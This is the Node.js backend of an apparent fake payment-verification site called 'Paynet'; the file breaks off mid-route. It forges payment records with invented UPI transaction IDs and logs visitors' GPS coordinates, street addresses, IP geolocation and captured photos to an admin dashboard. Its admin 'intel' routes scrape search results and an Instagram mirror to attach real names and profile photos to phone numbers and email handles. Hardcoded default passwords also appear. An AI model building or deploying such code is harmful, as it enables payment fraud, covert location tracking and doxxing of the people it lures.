// Paynet - Payment Verification System
// Production-Ready Build: 2026-02-15
const express = require("express");
const app = express();
const hbs = require("hbs");
const session = require("express-session");
const nocache = require("nocache");
const fetch = require("node-fetch");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
require("dotenv").config();
const cloudinary = require("cloudinary").v2;


// Cloudinary Configuration
if (process.env.CLOUDINARY_URL) {
  cloudinary.config({
    cloudinary_url: process.env.CLOUDINARY_URL
  });
} else {
  cloudinary.config({
    cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
    api_key: process.env.CLOUDINARY_API_KEY,
    api_secret: process.env.CLOUDINARY_API_SECRET
  });
}

// Trust proxy (required for Render, Heroku, etc.)
app.set("trust proxy", 1);

// Prevent caching (single instance)
app.use(nocache());

// Production Security Headers
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.setHeader("X-XSS-Protection", "1; mode=block");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  if (process.env.NODE_ENV === 'production') {
    res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  }
  next();
});

// GZIP Compression for production
try {
  const compression = require('compression');
  app.use(compression({ level: 6, threshold: 1024 }));
} catch (e) {
  // compression not installed, skip
}

// Static files with caching in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static("public", {
    maxAge: '1d',
    etag: true,
    lastModified: true
  }));
} else {
  app.use(express.static("public"));
}

// View engine setup
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "hbs");

// Demo login credentials
const username = "safwan";
const password = "saf123";

// Admin credentials (set in .env or use default)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "safwan@123";

// Admin authentication middleware
function requireAdmin(req, res, next) {
  if (!req.session.isAdmin) {
    return res.redirect("/admin-login");
  }
  next();
}

// Body parsers with size limits
app.use(express.urlencoded({ extended: true, limit: "10mb" }));
app.use(express.json({ limit: "10mb" }));


const FileStore = require("session-file-store")(session);

// Ensure essential directories exist (Required for Render/Ephemeral Filesystems)
// Crucial: Use { recursive: true } to prevent race conditions or parent directory errors
const sessionsDir = path.join(__dirname, "sessions");
if (!fs.existsSync(sessionsDir)) {
  console.log("Creating sessions directory (recursive):", sessionsDir);
  fs.mkdirSync(sessionsDir, { recursive: true });
}

const capturesDir = path.join(__dirname, "captures");
if (!fs.existsSync(capturesDir)) {
  console.log("Creating captures directory (recursive):", capturesDir);
  fs.mkdirSync(capturesDir, { recursive: true });
}

const adminCapturesDir = path.join(__dirname, "admin-captures");
if (!fs.existsSync(adminCapturesDir)) {
  console.log("Creating admin-captures directory (recursive):", adminCapturesDir);
  fs.mkdirSync(adminCapturesDir, { recursive: true });
}



// Session setup (secure secret from environment)
app.use(
  session({
    store: new FileStore({
      path: path.join(__dirname, "sessions"),
      checkPeriod: 3600,
      retries: 5
    }),
    secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex"),
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1000,
      sameSite: "lax"
    }
  })
);

// No-store cache control
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  next();
});

// Normalize IP addresses to ensure consistent matching
function normalizeIP(ip) {
  if (!ip) return 'unknown';
  ip = String(ip).trim();
  if (ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }
  if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
    return '127.0.0.1';
  }
  return ip;
}

// Get real client IP (supports multiple proxy headers)
function getClientIP(req) {
  const headers = [
    'x-forwarded-for',
    'x-real-ip',
    'cf-connecting-ip',
    'x-client-ip',
    'forwarded'
  ];

  for (const header of headers) {
    const value = req.headers[header];
    if (value) {
      const ip = value.split(',')[0].trim();
      if (ip && ip !== '::1' && ip !== '127.0.0.1') {
        return normalizeIP(ip);
      }
    }
  }

  const socketIP = req.socket.remoteAddress;

  if ((socketIP === '::1' || socketIP === '127.0.0.1' || socketIP === '::ffff:127.0.0.1') && process.env.MOCK_PUBLIC_IP) {
    return normalizeIP(process.env.MOCK_PUBLIC_IP);
  }

  return normalizeIP(socketIP || 'unknown');
}

// Multi-source geolocation API with fallback
async function getGeoWithFallback(ip) {
  if (ip === '::1' || ip === '127.0.0.1') {
    return {
      ip: ip,
      city: 'Development',
      region: 'Localhost',
      country: 'DEV',
      latitude: 0,
      longitude: 0,
      timezone: 'UTC',
      isp: 'Local Development',
      org: 'Local'
    };
  }

  // Try primary API: ipapi.co
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
    const data = await response.json();
    if (!data.error && data.city) {
      return {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        countryCode: data.country_code,
        latitude: data.latitude,
        longitude: data.longitude,
        timezone: data.timezone,
        isp: data.org,
        postalCode: data.postal,
        towerName: data.asn || data.org,
        towerDetails: `${data.network || ''} (${data.org || ''})`
      };
    }
  } catch (err) { /* fallback */ }

  // Fallback 1: ip-api.com
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`, { timeout: 5000 });
    const data = await response.json();
    if (data.status === 'success') {
      return {
        ip: data.query,
        city: data.city,
        region: data.regionName,
        country: data.country,
        countryCode: data.countryCode,
        latitude: data.lat,
        longitude: data.lon,
        timezone: data.timezone,
        isp: data.isp,
        postalCode: data.zip,
        towerName: data.as || data.isp,
        towerDetails: `${data.org || ''} - ${data.as || ''}`
      };
    }
  } catch (err) { /* fallback */ }

  // Fallback 2: ipwhois.app
  try {
    const response = await fetch(`https://ipwho.is/${ip}`, { timeout: 5000 });
    const data = await response.json();
    if (data.success) {
      return {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country,
        countryCode: data.country_code,
        latitude: data.latitude,
        longitude: data.longitude,
        timezone: data.timezone?.id,
        isp: data.connection?.isp,
        postalCode: data.postal,
        towerName: data.connection?.asn || data.connection?.isp,
        towerDetails: `${data.connection?.org || ''} (${data.connection?.isp || ''})`
      };
    }
  } catch (err) { /* fallback */ }

  return null;
}

// Reverse geocode GPS coordinates to address using Nominatim (OSM)
// Rate limiter: Nominatim requires max 1 request/second
let lastGeocodingCall = 0;
const geocodeCache = new Map(); // Cache results to avoid duplicate API calls

async function reverseGeocode(lat, lon) {
  try {
    // Round to 4 decimal places for cache key (~11m precision)
    const cacheKey = `${parseFloat(lat).toFixed(4)},${parseFloat(lon).toFixed(4)}`;
    if (geocodeCache.has(cacheKey)) {
      return geocodeCache.get(cacheKey);
    }

    // Rate limit: ensure 1100ms between calls
    const now = Date.now();
    const timeSinceLast = now - lastGeocodingCall;
    if (timeSinceLast < 1100) {
      await new Promise(r => setTimeout(r, 1100 - timeSinceLast));
    }
    lastGeocodingCall = Date.now();

    const response = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
      {
        headers: { 'User-Agent': 'PaynetApp/1.0' },
        timeout: 5000
      }
    );
    const data = await response.json();
    if (data.address) {
      const result = {
        fullAddress: data.display_name,
        road: data.address.road,
        neighborhood: data.address.neighbourhood || data.address.suburb,
        city: data.address.city || data.address.town || data.address.village,
        state: data.address.state,
        country: data.address.country,
        postcode: data.address.postcode
      };
      geocodeCache.set(cacheKey, result);
      // Limit cache size
      if (geocodeCache.size > 500) {
        const firstKey = geocodeCache.keys().next().value;
        geocodeCache.delete(firstKey);
      }
      return result;
    }
  } catch (err) {
    console.log("Reverse geocoding failed:", err.message);
  }
  return null;
}

// Keep old function for backwards compatibility
async function getGeo(ip) {
  return getGeoWithFallback(ip);
}

// Hash password using SHA-256
function hashPassword(password) {
  if (!password) return null;
  return crypto.createHash("sha256").update(password).digest("hex");
}

// ============ UNIVERSAL LOCATION EXTRACTOR ============
// Extracts exact lat/long from ANY location data format stored in the system
function extractExactLocation(attempt) {
  let lat = null, lon = null, accuracy = null, source = null, address = null;

  // Priority 1: location.finalLocation.coords
  if (attempt.location) {
    const loc = typeof attempt.location === 'string' ? (() => { try { return JSON.parse(attempt.location); } catch (e) { return null; } })() : attempt.location;

    if (loc) {
      const final = loc.finalLocation;
      if (final) {
        if (final.coords && final.coords.latitude) {
          lat = final.coords.latitude;
          lon = final.coords.longitude;
          accuracy = final.coords.accuracy;
          source = final.source || loc.captureMethod || 'GPS';
          address = final.address || loc.address;
        } else if (final.latitude) {
          lat = final.latitude;
          lon = final.longitude;
          accuracy = final.accuracy;
          source = final.source || loc.captureMethod || 'GPS';
          address = final.address || loc.address;
        }
      }

      // Direct coords on location object
      if (!lat && loc.latitude) {
        lat = loc.latitude;
        lon = loc.longitude;
        accuracy = loc.accuracy;
        source = loc.source || loc.captureMethod || 'Direct';
        address = loc.address;
      }

      if (!lat && loc.coords && loc.coords.latitude) {
        lat = loc.coords.latitude;
        lon = loc.coords.longitude;
        accuracy = loc.coords.accuracy;
        source = loc.source || 'GPS-Coords';
        address = loc.address;
      }
    }
  }

  // Priority 2: gpsLocation field (legacy)
  if (!lat && attempt.gpsLocation && attempt.gpsLocation.latitude) {
    lat = attempt.gpsLocation.latitude;
    lon = attempt.gpsLocation.longitude;
    accuracy = attempt.gpsLocation.accuracy;
    source = 'GPS-Legacy';
  }

  // Priority 3: locationHistory (latest entry)
  if (!lat && attempt.locationHistory && attempt.locationHistory.length > 0) {
    const latest = attempt.locationHistory[attempt.locationHistory.length - 1];
    if (latest.coords) {
      lat = latest.coords.latitude;
      lon = latest.coords.longitude;
      accuracy = latest.coords.accuracy;
      source = latest.source || 'History';
    }
  }

  // Priority 4: IP-based geo (least accurate)
  if (!lat && attempt.geo && attempt.geo.latitude) {
    lat = attempt.geo.latitude;
    lon = attempt.geo.longitude;
    accuracy = 5000; // IP-based, ~5km
    source = 'IP-Geolocation';
  }

  return { lat, lon, accuracy, source, address };
}

// Load/Save Settings
const settingsFile = path.join(__dirname, "settings.json");
const defaultSettings = { paymentAmount: "500.00", currencySymbol: "₹", enableAnimation: true };

function getSettings() {
  try {
    if (fs.existsSync(settingsFile)) {
      return JSON.parse(fs.readFileSync(settingsFile, "utf-8"));
    }
  } catch (err) {
    console.error("Error reading settings, using defaults:", err.message);
  }
  return { ...defaultSettings };
}

function saveSettings(newSettings) {
  fs.writeFileSync(settingsFile, JSON.stringify(newSettings, null, 2));
}

// Safe JSON file reader
function safeReadJSON(filePath, fallback = []) {
  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, "utf-8").trim();
      if (content) return JSON.parse(content);
    }
  } catch (err) {
    console.error(`Error reading ${filePath}:`, err.message);
    const bakPath = filePath + ".bak";
    try {
      if (fs.existsSync(bakPath)) {
        const bakContent = fs.readFileSync(bakPath, "utf-8").trim();
        if (bakContent) return JSON.parse(bakContent);
      }
    } catch (bakErr) {
      console.error("Backup recovery failed:", bakErr.message);
    }
  }
  return fallback;
}

// Safe JSON file writer (creates backup first)
function safeWriteJSON(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      fs.copyFileSync(filePath, filePath + ".bak");
    }
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(`Error writing ${filePath}:`, err.message);
  }
}

// Mutex for safe JSON writes
class Mutex {
  constructor() {
    this.queue = [];
    this.locked = false;
  }
  async lock() {
    return new Promise(resolve => {
      if (this.locked) {
        this.queue.push(resolve);
      } else {
        this.locked = true;
        resolve();
      }
    });
  }
  unlock() {
    if (this.queue.length > 0) {
      const next = this.queue.shift();
      next();
    } else {
      this.locked = false;
    }
  }
}

const dbLock = new Mutex();

async function safeUpdateJSON(filepath, updateFn) {
  await dbLock.lock();
  try {
    const data = safeReadJSON(filepath, []);
    const newData = updateFn(data);
    safeWriteJSON(filepath, newData);
    return newData;
  } finally {
    dbLock.unlock();
  }
}

// ============ ROUTES ============

app.get("/", (req, res) => {
  res.render("payment", { ...getSettings(), layout: false });
});

app.get("/login", (req, res) => {
  res.render("login", { layout: false });
});

app.get("/payment", (req, res) => {
  res.render("payment", { ...getSettings(), layout: false });
});

app.get("/verify", (req, res) => {
  res.render("verify", { ...getSettings(), layout: false });
});

// Validate Payment ID
app.post("/validate-payment-id", (req, res) => {
  const { paymentId } = req.body;

  if (!paymentId || paymentId.length < 6) {
    return res.json({
      valid: false,
      message: "Invalid Payment ID format. Please check and try again."
    });
  }

  const paymentsFile = path.join(__dirname, "generatedPayments.json");
  const payments = safeReadJSON(paymentsFile, []);
  const payment = payments.find(p => p.id === paymentId);

  if (payment) {
    return res.json({
      valid: true,
      payment: { ...payment, isCustom: true }
    });
  }

  res.json({
    valid: true,
    payment: {
      id: paymentId,
      amount: getSettings().paymentAmount || "500.00",
      merchant: "Paynet Services",
      date: new Date().toLocaleString('en-IN', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
      }),
      isCustom: false
    }
  });
});

// Admin API: Generate payment
app.post("/admin/api/generate-payment", requireAdmin, (req, res) => {
  try {
    const { amount, toName, fromName, bankName, upiId, upiTxnId, googleTxnId, customDate } = req.body;
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let id = '';
    for (let i = 0; i < 10; i++) {
      id += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    const newPayment = {
      id, amount, toName, fromName, bankName, upiId, upiTxnId, googleTxnId,
      date: customDate || new Date().toLocaleString('en-IN', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
      }),
      createdAt: new Date().toISOString()
    };

    const paymentsFile = path.join(__dirname, "generatedPayments.json");
    let payments = safeReadJSON(paymentsFile, []);
    payments.push(newPayment);
    safeWriteJSON(paymentsFile, payments);

    res.json({ success: true, payment: newPayment });
  } catch (error) {
    console.error("Error generating payment:", error);
    res.status(500).json({ success: false, error: "Failed to generate payment" });
  }
});

// Admin API: Settings
app.post("/admin/api/settings", requireAdmin, (req, res) => {
  const { paymentAmount, currencySymbol, enableAnimation } = req.body;
  const newSettings = {
    paymentAmount,
    currencySymbol,
    enableAnimation: enableAnimation === 'on' || enableAnimation === true
  };
  saveSettings(newSettings);
  res.redirect("/admin");
});

app.post("/admin/api/intel/lookup", requireAdmin, async (req, res) => {
  const { number, type } = req.body;

  // SIMULATION: In a real app, this would call Truecaller/OSINT APIs
  // For now, we return realistic mock data to demonstrate the UI

  // REAL CARRIER LOOKUP (Partial DB)
  // REAL CARRIER LOOKUP (Expanded DB)
  const prefixes = {
    // Mumbai
    '9820': 'Vodafone Mumbai', '9920': 'Vodafone Mumbai', '9869': 'MTNL Mumbai', '9819': 'Vodafone Mumbai',
    '9867': 'Airtel Mumbai', '9892': 'Airtel Mumbai', '9930': 'Jio Mumbai', '9322': 'Reliance Mumbai',
    '8879': 'Vodafone Mumbai', '7045': 'Vodafone Mumbai', '8108': 'Idea Mumbai',
    // Delhi
    '9810': 'Airtel Delhi', '9811': 'Vodafone Delhi', '9818': 'Airtel Delhi', '9873': 'Vodafone Delhi',
    '9910': 'Airtel Delhi', '9911': 'Idea Delhi', '9958': 'Airtel Delhi', '9999': 'Vodafone Delhi',
    '8860': 'Vodafone Delhi', '8800': 'Airtel Delhi', '9560': 'Airtel Delhi', '9711': 'Vodafone Delhi',
    // Karnataka
    '9845': 'Airtel Karnataka', '9886': 'Vodafone Karnataka', '9448': 'BSNL Karnataka', '9449': 'BSNL Karnataka',
    '9900': 'Airtel Karnataka', '9901': 'Airtel Karnataka', '9902': 'Airtel Karnataka', '9945': 'Vodafone Karnataka',
    '9740': 'Airtel Karnataka', '9741': 'Vodafone Karnataka', '9742': 'Vodafone Karnataka', '8197': 'Airtel Karnataka',
    // Tamil Nadu & Chennai
    '9840': 'Airtel Chennai', '9841': 'Vodafone Chennai', '9444': 'BSNL Chennai', '9445': 'BSNL Tamil Nadu',
    '9842': 'Airtel Tamil Nadu', '9843': 'Vodafone Tamil Nadu', '9894': 'Airtel Tamil Nadu', '9940': 'Airtel Chennai',
    '9884': 'Vodafone Chennai', '9962': 'Vodafone Chennai', '9790': 'Airtel Tamil Nadu', '9789': 'Vodafone Tamil Nadu',
    // Andhra & Telangana
    '9848': 'Airtel AP', '9849': 'Airtel AP', '9866': 'Airtel AP', '9948': 'Idea AP', '9949': 'Idea AP',
    '9440': 'BSNL AP', '9441': 'BSNL AP', '9490': 'BSNL AP', '9491': 'BSNL AP', '9959': 'Airtel AP',
    '9989': 'Airtel AP', '9963': 'Airtel AP', '9912': 'Idea AP', '9550': 'Airtel AP',
    // Maharashtra (Rest)
    '9422': 'BSNL Maharashtra', '9423': 'BSNL Maharashtra', '9822': 'Idea Maharashtra', '9823': 'Vodafone Maharashtra',
    '9850': 'Idea Maharashtra', '9881': 'Idea Maharashtra', '9890': 'Airtel Maharashtra', '9921': 'Idea Maharashtra',
    '9545': 'Vodafone Maharashtra', '9762': 'Idea Maharashtra', '9763': 'Idea Maharashtra', '9764': 'Idea Maharashtra',
    // Kolkata & WB
    '9830': 'Vodafone Kolkata', '9831': 'Airtel Kolkata', '9433': 'BSNL Kolkata', '9432': 'BSNL Kolkata',
    '9832': 'Airtel WB', '9732': 'Vodafone WB', '9733': 'Vodafone WB', '9734': 'Vodafone WB',
    '9903': 'Airtel Kolkata', '9163': 'Airtel Kolkata', '9836': 'Vodafone Kolkata', '9874': 'Vodafone Kolkata',
    // UP (East/West)
    '9837': 'Idea UP West', '9838': 'Vodafone UP East', '9839': 'Vodafone UP East', '9415': 'BSNL UP East',
    '9412': 'BSNL UP West', '9411': 'BSNL UP West', '9450': 'BSNL UP East', '9451': 'BSNL UP East',
    '9935': 'Airtel UP East', '9936': 'Airtel UP East', '9756': 'Vodafone UP West', '9758': 'Vodafone UP West',
    // Gujarat
    '9824': 'Idea Gujarat', '9825': 'Vodafone Gujarat', '9879': 'Vodafone Gujarat', '9426': 'BSNL Gujarat',
    '9898': 'Airtel Gujarat', '9909': 'Vodafone Gujarat', '9924': 'Idea Gujarat', '9925': 'Idea Gujarat',
    '9723': 'Vodafone Gujarat', '9724': 'Airtel Gujarat', '9725': 'Airtel Gujarat', '9727': 'Idea Gujarat',
    // Kerala
    '9846': 'Vodafone Kerala', '9847': 'Vodafone Kerala', '9895': 'Airtel Kerala', '9447': 'BSNL Kerala',
    '9446': 'BSNL Kerala', '9400': 'BSNL Kerala', '9495': 'BSNL Kerala', '9496': 'BSNL Kerala',
    '9946': 'Idea Kerala', '9947': 'Idea Kerala', '9961': 'Idea Kerala', '9744': 'Idea Kerala',
    // Rajasthan
    '9828': 'Vodafone Rajasthan', '9829': 'Airtel Rajasthan', '9414': 'BSNL Rajasthan', '9413': 'BSNL Rajasthan',
    '9928': 'Airtel Rajasthan', '9929': 'Airtel Rajasthan', '9982': 'Vodafone Rajasthan', '9983': 'Vodafone Rajasthan',
    // Jio (Pan India - partial)
    '7000': 'Jio Pan India', '7001': 'Jio Pan India', '7002': 'Jio Pan India', '7003': 'Jio Pan India',
    '6290': 'Jio Pan India', '6291': 'Jio Pan India', '6292': 'Jio Pan India', '7900': 'Jio Pan India'
  };

  // Processing Logic
  if (number && number.length === 10) {
    const prefix = number.substring(0, 4);
    const fullCarrier = prefixes[prefix] || "Unknown Operator (PAN India)";

    // Parse parsing "Airtel Mumbai" -> Carrier: Airtel, Circle: Mumbai
    let carrierName = fullCarrier;
    let circleName = "India (General)";

    if (fullCarrier !== "Unknown Operator (PAN India)") {
      const parts = fullCarrier.split(' ');
      carrierName = parts[0];
      circleName = parts.slice(1).join(' ');
    }

    // --- PASSIVE OSINT SCAN (Server-Side) ---
    // Extract Real Name from Search Engine Snippets (Truecaller/Facebook Index)
    let foundName = null;
    let foundSource = "Public Records";

    try {
      const q = `%2B91${number}`; // +91 format
      // Use DuckDuckGo HTML (No JS, Low Ban Rate)
      const ddgRes = await fetch(`https://html.duckduckgo.com/html/?q=${q}`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
          'Referer': 'https://html.duckduckgo.com/'
        }
      });
      const ddgHtml = await ddgRes.text();

      // Regex to find titles: >Name - Truecaller<
      // Fallback patterns included
      const truecallerMatch = ddgHtml.match(/>([^<]+?) [-|] Truecaller</);
      const fbMatch = ddgHtml.match(/>([^<]+?) [-|] Facebook</);
      const genericMatch = ddgHtml.match(/>([^<]+?) - Phone Number Detail</);

      if (truecallerMatch && truecallerMatch[1]) {
        foundName = truecallerMatch[1].trim();
        foundSource = "Truecaller (Confirmed)";
      } else if (fbMatch && fbMatch[1]) {
        foundName = fbMatch[1].trim();
        foundSource = "Facebook (Linked)";
      } else if (genericMatch && genericMatch[1]) {
        foundName = genericMatch[1].trim();
        foundSource = "Telecom Directory";
      }

      // Clean up common bad catches
      if (foundName && (foundName.includes('Phone') || foundName.includes('Number') || foundName.length < 3)) {
        foundName = null;
      }

    } catch (e) {
      console.error("OSINT Scan Error:", e);
    }

    return res.json({
      success: true,
      data: {
        valid: !!prefixes[prefix],
        carrier: carrierName,
        circle: circleName,
        country: "India (+91)",
        // NEW REAL DATA
        name: foundName || "Name Not Public",
        source: foundSource,
        is_real_name: !!foundName
      }
    });
  }

  return res.json({ success: false, error: "Invalid 10-digit number" });
});

// ============ REAL OSINT (Identity Lookup - Public Scraper) ============
const HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9'
};

app.post('/admin/api/intel/osint', requireAdmin, async (req, res) => {
  const { query } = req.body;

  if (!query) return res.json({ success: false, error: "Query required" });

  let target = query.trim();
  const isEmail = query.includes('@');

  // AUTO-DETECT: If Email -> Extract Handle and Search Instagram
  if (isEmail) {
    target = target.split('@')[0];
  }

  // CORE LOGIC: Unified Public Scrape (Works for Email Handle OR Username)
  try {
    // Fetch Public Profile HTML
    const response = await fetch(`https://www.picuki.com/profile/${target}`, { headers: HEADERS });

    if (response.status === 404) {
      return res.json({ success: false, error: `No Instagram found matching email handle: ${target}` });
    }

    const html = await response.text();

    // Extract Real Profile Data from Mirror
    // Picuki stores the HD profile pic in the 'profile-avatar' div
    const imageMatch = html.match(/class="profile-avatar"[^>]*src="([^"]+)"/);
    const nameMatch = html.match(/<h1[^>]*class="profile-name-bottom"[^>]*>([^<]+)<\/h1>/) || html.match(/<h2[^>]*>([^<]+)<\/h2>/);
    const bioMatch = html.match(/<div class="profile-description">([\s\S]*?)<\/div>/);
    const followersMatch = html.match(/class="followed_by"[^>]*>(\d+[a-zA-Z0-9.,]*)/); // Extract number

    if (!imageMatch) {
      return res.json({
        success: true,
        type: 'instagram',
        data: {
          username: target,
          photo: `https://ui-avatars.com/api/?name=${target}&background=E1306C&color=fff`,
          platform: 'Instagram (Link Only)',
          is_real_data: false,
          details: {
            "Stats": "Private / Unreachable",
            "Bio/Name": "Target profile is protected or mirror is blocking API. Click to check manually.",
            "Public Link": `https://instagram.com/${target}`
          }
        }
      });
    }

    // Parse Data
    const photo = imageMatch[1];
    const fullName = nameMatch ? nameMatch[1].trim() : target;
    // desc format: "100 Followers, 50 Following, 10 Posts - See Instagram photos and videos from Name (@user)"

    const followers = followersMatch ? followersMatch[1] : "Hidden";
    const bio = bioMatch ? bioMatch[1].replace(/<br\s*\/?>/gi, '\n').trim() : "No public bio";

    return res.json({
      success: true,
      type: 'instagram',
      data: {
        username: target,
        photo: photo, // REAL HD URL
        platform: 'Instagram',
        is_real_data: true,
        details: {
          "Stats": `${followers} Followers`,
          "Bio/Name": `${fullName} • ${bio.substring(0, 50)}...`,
          "Public Link": `https://instagram.com/${target}`
        }
      }
    });

  } catch (error) {
    console.error("Mirror Error:", error);
    return res.json({
      success: true,
      type: 'instagram',
      data: {
        username: target,
        photo: `https://ui-avatars.com/api/?name=${target}&background=E1306C&color=fff`,
        platform: 'Instagram (Network Issue)',
        is_real_data: false,
        details: {
          "Stats": "Scraper Blocked",
          "Bio/Name": "Connection to mirror failed. Click to verify manually.",
          "Public Link": `https://instagram.com/${target}`
        }
      }
    });
  }

});

// Admin Dashboard
app.get("/admin", requireAdmin, (req, res) => {
  const settings = getSettings();
  const logFile = path.join(__dirname, "loginAttempts.json");
  let attempts = safeReadJSON(logFile, []);

  res.render("admin", {
    attempts: attempts.reverse(),
    settings: settings,
    layout: false
  });
});

app.get("/admin-login", (req, res) => {
  if (req.session.isAdmin) {
    return res.redirect("/admin");
  }
  res.render("admin-login", { error: req.session.adminError, layout: false });
  req.session.adminError = null;
});

app.post("/admin-auth", (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    return res.redirect("/admin");
  }
  req.session.adminError = "Invalid password";
  res.redirect("/admin-login");
});

// ============ ADMIN DATA API ============
// Returns all attempts with pre-extracted exact location data
app.get("/admin/api/data", requireAdmin, (req, res) => {
  try {
    const logFile = path.join(__dirname, "loginAttempts.json");
    let attempts = safeReadJSON(logFile, []);

    // Sort by timestamp descending
    attempts.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    // PRE-EXTRACT exact location for every attempt
    attempts = attempts.map(attempt => {
      const exactLoc = extractExactLocation(attempt);
      return {
        ...attempt,
        exactLocation: {
          latitude: exactLoc.lat,
          longitude: exactLoc.lon,
          accuracy: exactLoc.accuracy,
          source: exactLoc.source,
          address: exactLoc.address,
          hasExactCoords: exactLoc.lat !== null && exactLoc.lon !== null,
          googleMapsUrl: exactLoc.lat ? `https://www.google.com/maps?q=${exactLoc.lat},${exactLoc.lon}` : null,
          osmUrl: exactLoc.lat ? `https://www.openstreetmap.org/?mlat=${exactLoc.lat}&mlon=${exactLoc.lon}&zoom=18` : null
        }
      };
    });

    // Get photos
    const capturesDir = path.join(__dirname, "captures");
    let photos = [];
    if (fs.existsSync(capturesDir)) {
      const files = fs.readdirSync(capturesDir);
      photos = files.filter(f => /\.(jpg|jpeg|png|webp)$/i.test(f)).map(filename => ({
        filename,
        path: `/admin/photo/${filename}`,
        isLocal: true,
        timestamp: fs.statSync(path.join(capturesDir, filename)).mtime
      }));
    }

    // Add photos from attempts
    attempts.forEach(attempt => {
      if (attempt.photos && Array.isArray(attempt.photos)) {
        attempt.photos.forEach(photo => {
          photos.push({
            filename: photo.filename,
            path: photo.url || photo.localPath,
            isLocal: !photo.url,
            type: photo.type,
            attemptId: attempt.verificationId,
            timestamp: photo.timestamp
          });
        });
      }
      if (attempt.cloudinaryUrl) {
        photos.push({
          filename: attempt.verificationId + ".jpg",
          path: attempt.cloudinaryUrl,
          isLocal: false,
          attemptId: attempt.verificationId,
          timestamp: attempt.timestamp
        });
      }
    });

    // Load pending photos
    const photosFile = path.join(__dirname, "pendingPhotos.json");
    const pendingPhotos = safeReadJSON(photosFile, []);

    // Backfill: Link pending photos to attempts
    attempts.forEach(attempt => {
      if (attempt.verificationId) {
        const linked = pendingPhotos.filter(p => p.paymentId === attempt.verificationId);
        if (linked.length > 0) {
          if (!attempt.photos) attempt.photos = [];
          linked.forEach(lp => {
            const exists = attempt.photos.some(existing => existing.url === lp.url || existing.filename === lp.filename);
            if (!exists) attempt.photos.push(lp);
          });
        }
      }
    });

    // Add pending photos to gallery
    pendingPhotos.forEach(photo => {
      const photoPath = photo.url || photo.localPath || (photo.filename ? `/admin/photo/${photo.filename}` : null);
      if (photoPath) {
        photos.push({
          filename: photo.filename || 'pending',
          path: photoPath,
          isLocal: !photo.url,
          type: photo.type || 'pending',
          attemptId: 'Pending',
          timestamp: photo.timestamp
        });
      }
    });

    // Remove duplicates and sort
    photos = photos.filter((photo, index, self) =>
      index === self.findIndex(p => p.path === photo.path)
    ).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    res.json({ attempts, photos });
  } catch (error) {
    console.error("Error reading admin data:", error);
    res.status(500).json({ error: "Failed to load data" });
  }
});

// ============ EXACT LOCATION API ============
// Returns just the exact coordinates for a specific attempt
app.get("/admin/api/location/:id", requireAdmin, (req, res) => {
  try {
    const { id } = req.params;
    const logFile = path.join(__dirname, "loginAttempts.json");
    const attempts = safeReadJSON(logFile, []);
    const attempt = attempts.find(a => a.verificationId === id);

    if (!attempt) {
      return res.status(404).json({ error: "Attempt not found" });
    }

    const exactLoc = extractExactLocation(attempt);

    res.json({
      verificationId: id,
      exactLocation: {
        latitude: exactLoc.lat,
        longitude: exactLoc.lon,
        accuracy: exactLoc.accuracy,
        source: exactLoc.source,
        address: exactLoc.address,
        hasExactCoords: exactLoc.lat !== null && exactLoc.lon !== null
      },
      locationHistory: attempt.locationHistory || [],
      geo: attempt.geo,
      rawLocation: attempt.location
    });
  } catch (error) {
    console.error("Error fetching location:", error);
    res.status(500).json({ error: "Failed to fetch location" });
  }
});

// Photo routes
app.get("/admin/photo/:filename", requireAdmin, (req, res) => {
  const { filename } = req.params;
  const filepath = path.join(__dirname, "captures", filename);
  if (fs.existsSync(filepath)) {
    res.sendFile(filepath);
  } else {
    res.status(404).send("Photo not found");
  }
});

app.delete("/admin/photo/delete/:filename", requireAdmin, async (req, res) => {
  try {
    const { filename } = req.params;
    const capturesDir = path.join(__dirname, "captures");
    const filepath = path.join(capturesDir, filename);
    let deleted = false;

    if (fs.existsSync(filepath)) {
      try {
        fs.unlinkSync(filepath);
        deleted = true;
      } catch (e) {
        console.error("File delete error:", e);
      }
    }

